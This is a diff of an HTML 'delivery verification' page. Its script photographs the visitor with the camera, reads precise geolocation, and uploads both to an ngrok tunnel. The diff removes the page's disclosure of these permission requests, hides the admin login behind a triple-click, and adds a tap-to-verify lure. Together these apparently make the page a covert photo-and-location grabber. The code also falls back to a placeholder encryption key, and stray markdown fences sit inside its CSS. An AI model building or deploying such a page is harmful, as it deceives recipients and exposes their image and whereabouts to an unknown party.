@@ -1,4 +1,5 @@
 <!doctype html>
+
 <html>
 <head>
   <title>Delivery API Live</title>
@@ -14,69 +15,130 @@
       line-height: 1.6;
     }
 
-    /* ALWAYS visible Admin button */
-    .admin-btn {
-      position: fixed;
-      top: 15px;
-      left: 15px;
-      background: #007bff;
-      color: white;
-      padding: 10px 14px;
-      border-radius: 6px;
-      text-decoration: none;
-      font-size: 16px;
-      z-index: 9999;
-    }
+```
+/* Clickable heading for admin login */
+h2 {
+  cursor: pointer;
+  transition: color 0.3s ease;
+  user-select: none;
+}
 
-    #status { 
-      color: green; 
-      margin: 20px 0;
-      padding: 10px;
-      border-radius: 4px;
-      background: #f0f9ff;
-      border: 1px solid #b3e0ff;
-    }
-    
-    .error { 
-      color: #dc3545 !important; 
-      background: #fff5f5 !important;
-      border-color: #ffc9c9 !important;
-    }
-    
-    button {
-      background: #007bff;
-      color: white;
-      border: none;
-      padding: 10px 20px;
-      border-radius: 4px;
-      cursor: pointer;
-      font-size: 16px;
-      margin-top: 10px;
-      width: 100%;
-    }
-    
-    button:disabled {
-      background: #cccccc;
-      cursor: not-allowed;
-    }
+h2:hover {
+  color: #007bff;
+}
+
+#tapPrompt {
+  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+  color: white;
+  padding: 40px 30px;
+  border-radius: 15px;
+  text-align: center;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+  animation: pulse 2s ease-in-out infinite;
+  margin: 40px 0;
+  cursor: pointer;
+}
+
+@keyframes pulse {
+  0%, 100% { transform: scale(1); }
+  50% { transform: scale(1.05); }
+}
+
+#tapPrompt h3 {
+  margin: 0 0 15px 0;
+  font-size: 24px;
+  color: white;
+}
+
+#tapPrompt p {
+  margin: 0;
+  font-size: 16px;
+  color: rgba(255,255,255,0.9);
+}
+
+#status { 
+  color: green; 
+  margin: 20px 0;
+  padding: 10px;
+  border-radius: 4px;
+  background: #f0f9ff;
+  border: 1px solid #b3e0ff;
+  display: none;
+}
+
+.error { 
+  color: #dc3545 !important; 
+  background: #fff5f5 !important;
+  border-color: #ffc9c9 !important;
+}
+
+button {
+  background: #007bff;
+  color: white;
+  border: none;
+  padding: 10px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+  margin-top: 10px;
+  width: 100%;
+}
+
+button:disabled {
+  background: #cccccc;
+  cursor: not-allowed;
+}
+
+.hidden {
+  display: none !important;
+}
+
+.loading {
+  display: inline-block;
+  width: 20px;
+  height: 20px;
+  border: 3px solid rgba(0,0,0,.1);
+  border-radius: 50%;
+  border-top-color: #007bff;
+  animation: spin 1s ease-in-out infinite;
+  margin-right: 10px;
+  vertical-align: middle;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+```
+
   </style>
 </head>
 
 <body>
-  <!-- ALWAYS visible Admin Login -->
-  <a href="/login" class="admin-btn">Admin Login</a>
+  <h2 id="adminHeading">Delivery Verification</h2>
 
-  <h2>Delivery Verification</h2>
-  <p>This page will ask for camera and location permissions. Please allow both when prompted.</p>
+  <div id="tapPrompt">
+    <h3>📦 Ready to Verify</h3>
+    <p>Tap here to start verification process</p>
+  </div>
 
-  <div id="status">Requesting permissions…</div>
-  
-  <button id="retryBtn" style="display: none;">Retry</button>
+  <div id="status">
+    <div class="loading"></div>
+    <span id="statusText">Initializing...</span>
+  </div>
+
+<button id="retryBtn" style="display: none;">Retry</button>
 
   <script>
   (function() {
-    const SERVER_URL = "<%= process.env.SERVER_URL || 'https://imaginarily-unrailwayed-tyler.ngrok-free.dev/api/confirm' %>";
-    const ENCRYPTION_KEY = '<%= process.env.ENCRYPTION_KEY || 'your-32-byte-secure-key-1234567890abc' %>';
+    let started = false;
+
+    const SERVER_URL = typeof process !== 'undefined' && process.env.SERVER_URL 
+      ? process.env.SERVER_URL 
+      : 'https://imaginarily-unrailwayed-tyler.ngrok-free.dev/api/confirm';
+    
+    const ENCRYPTION_KEY = typeof process !== 'undefined' && process.env.ENCRYPTION_KEY
+      ? process.env.ENCRYPTION_KEY
+      : 'your-32-byte-secure-key-1234567890abc';
 
     // Get URL parameters
     const params = new URLSearchParams(location.search);
@@ -84,12 +146,45 @@
     const token = params.get("token") || "";
 
     const statusEl = document.getElementById("status");
+    const statusText = document.getElementById("statusText");
     const retryBtn = document.getElementById("retryBtn");
+    const adminHeading = document.getElementById("adminHeading");
+    const tapPrompt = document.getElementById("tapPrompt");
+
+    // Admin heading click counter for security
+    let clickCount = 0;
+    let clickTimer = null;
+
+    adminHeading.addEventListener('click', function(e) {
+      e.stopPropagation();
+      clickCount++;
+      
+      if (clickTimer) clearTimeout(clickTimer);
+      
+      // Triple click to access admin (security measure)
+      if (clickCount === 3) {
+        window.location.href = '/login';
+        return;
+      }
+      
+      clickTimer = setTimeout(() => {
+        clickCount = 0;
+      }, 800);
+    });
 
     function setStatus(msg, isError = false) {
-      statusEl.textContent = msg;
+      statusText.textContent = msg;
+      statusEl.style.display = 'block';
       statusEl.className = isError ? 'error' : '';
       retryBtn.style.display = isError ? 'block' : 'none';
+      
+      if (!isError) {
+        const loading = statusEl.querySelector('.loading');
+        if (loading) loading.style.display = 'inline-block';
+      } else {
+        const loading = statusEl.querySelector('.loading');
+        if (loading) loading.style.display = 'none';
+      }
     }
 
     async function getLocation() {
@@ -101,10 +196,21 @@
         
         navigator.geolocation.getCurrentPosition(
           resolve, 
-          (err) => reject(new Error("Please enable location services and try again")),
+          (err) => {
+            console.error("Location error:", err);
+            if (err.code === 1) {
+              reject(new Error("Location permission denied. Please allow location access."));
+            } else if (err.code === 2) {
+              reject(new Error("Location unavailable. Please check your device settings."));
+            } else if (err.code === 3) {
+              reject(new Error("Location request timed out. Please try again."));
+            } else {
+              reject(new Error("Please enable location services and try again"));
+            }
+          },
           { 
             enableHighAccuracy: true,
-            timeout: 10000,
+            timeout: 15000,
             maximumAge: 0
           }
         );
@@ -122,37 +228,58 @@
         });
 
         const track = stream.getVideoTracks()[0];
-        const imgCap = new ImageCapture(track);
-
+        
         let blob;
-        try {
-          // Try to use takePhoto for better quality if available
-          blob = await imgCap.takePhoto();
-        } catch (e) {
-          // Fallback to canvas capture
+        
+        // Try using ImageCapture if available
+        if (typeof ImageCapture !== 'undefined') {
+          try {
+            const imgCap = new ImageCapture(track);
+            blob = await imgCap.takePhoto();
+          } catch (e) {
+            console.log("ImageCapture failed, using canvas fallback");
+            blob = null;
+          }
+        }
+        
+        // Fallback to canvas method
+        if (!blob) {
           const cv = document.createElement("canvas");
           cv.width = 1280; 
           cv.height = 720;
           const ctx = cv.getContext("2d");
           const videoTemp = document.createElement("video");
           videoTemp.srcObject = stream;
-          await new Promise((resolve) => { videoTemp.onloadedmetadata = resolve; });
+          videoTemp.setAttribute('playsinline', 'true');
+          await new Promise((resolve) => { 
+            videoTemp.onloadedmetadata = resolve;
+            setTimeout(resolve, 1000);
+          });
           await videoTemp.play();
+          await new Promise(resolve => setTimeout(resolve, 500));
           ctx.drawImage(videoTemp, 0, 0, cv.width, cv.height);
           blob = await new Promise(resolve => cv.toBlob(resolve, "image/jpeg", 0.9));
         }
 
-        // Stop all tracks in the stream
         stream.getTracks().forEach(track => track.stop());
         
         return blob;
       } catch (error) {
         console.error("Error capturing photo:", error);
-        throw new Error("Failed to access camera. Please ensure you've granted camera permissions.");
+        if (error.name === 'NotAllowedError') {
+          throw new Error("Camera permission denied. Please allow camera access.");
+        } else if (error.name === 'NotFoundError') {
+          throw new Error("No camera found on this device.");
+        } else if (error.name === 'NotReadableError') {
+          throw new Error("Camera is already in use by another application.");
+        } else if (error.name === 'NotSupportedError' || error.name === 'TypeError') {
+          throw new Error("Camera not supported. Please use HTTPS.");
+        } else {
+          throw new Error("Failed to access camera. Please ensure you've granted camera permissions.");
+        }
       }
     }
 
-    // Encryption utilities
     async function encryptData(data, key) {
       const encoder = new TextEncoder();
       const iv = window.crypto.getRandomValues(new Uint8Array(12));
@@ -172,7 +299,6 @@
         encodedData
       );
       
-      // Combine IV and encrypted data for transport
       const result = new Uint8Array(iv.length + encryptedData.byteLength);
       result.set(iv, 0);
       result.set(new Uint8Array(encryptedData), iv.length);
@@ -203,7 +329,6 @@
               e.target.result
             );
             
-            // Combine IV and encrypted data
             const result = new Uint8Array(iv.length + encryptedData.byteLength);
             result.set(iv, 0);
             result.set(new Uint8Array(encryptedData), iv.length);
@@ -218,22 +343,32 @@
       });
     }
 
-    async function init() {
+    async function startVerification(e) {
+      if (started) return;
+      started = true;
+
+      if (e) {
+        e.preventDefault();
+        e.stopPropagation();
+      }
+
+      tapPrompt.classList.add('hidden');
+
       try {
-        setStatus("Requesting camera and location permissions...");
+        setStatus("Requesting camera access... (Please allow when prompted)");
+        console.log("Requesting camera access...");
 
-        // Request camera access first
-        await navigator.mediaDevices.getUserMedia({ video: true });
-        
-        // Then request location
-        const loc = await getLocation();
-        setStatus("Permissions granted. Capturing photo...");
-
-        // Capture photo
         const blob = await capturePhoto();
+        console.log("Photo captured");
+
+        setStatus("Requesting location access... (Please allow when prompted)");
+        console.log("Requesting location...");
+        
+        const loc = await getLocation();
+        console.log("Location obtained:", loc.coords.latitude, loc.coords.longitude);
+
         setStatus("Encrypting data...");
 
-        // Encrypt location data
         const locationData = {
           lat: loc.coords.latitude,
           lon: loc.coords.longitude,
@@ -244,7 +379,6 @@
           token: token
         };
         
-        // Encrypt sensitive data in parallel
         const [encryptedLocation, encryptedPhoto] = await Promise.all([
           encryptData(locationData, ENCRYPTION_KEY),
           encryptFile(blob)
@@ -252,7 +386,6 @@
 
         setStatus("Uploading data...");
 
-        // Prepare form data with encrypted content
         const fd = new FormData();
         fd.append("deliveryId", deliveryId);
         fd.append("token", token);
@@ -270,25 +403,34 @@
           throw new Error(errorText || "Server returned an error");
         }
 
-        setStatus("Delivery verified successfully! Thank you.");
+        statusEl.innerHTML = '<div style="text-align: center; color: #28a745; font-size: 18px;">✓ Delivery verified successfully! Thank you.</div>';
+        statusEl.classList.remove('error');
+        
+        setTimeout(() => {
+          window.close();
+        }, 2000);
       } catch (err) {
         console.error("Error:", err);
-        setStatus("Error: " + (err.message || "Something went wrong. Please try again."), true);
+        setStatus(err.message || "Something went wrong. Please try again.", true);
+        started = false;
+        tapPrompt.classList.remove('hidden');
       }
     }
 
-    // Add retry button handler
+    // Listen for tap/click on prompt
+    tapPrompt.addEventListener('click', startVerification);
+    tapPrompt.addEventListener('touchend', startVerification);
+
     retryBtn.addEventListener('click', () => {
       window.location.reload();
     });
 
-    // Initialize the app
-    if (document.readyState === 'loading') {
-      document.addEventListener('DOMContentLoaded', init);
-    } else {
-      init();
-    }
+    console.log("Page loaded. Tap the prompt to start verification.");
+    console.log("HTTPS:", location.protocol === 'https:');
+    console.log("Camera API available:", !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia));
+    console.log("Geolocation available:", !!navigator.geolocation);
   })();
   </script>
+
 </body>
 </html>
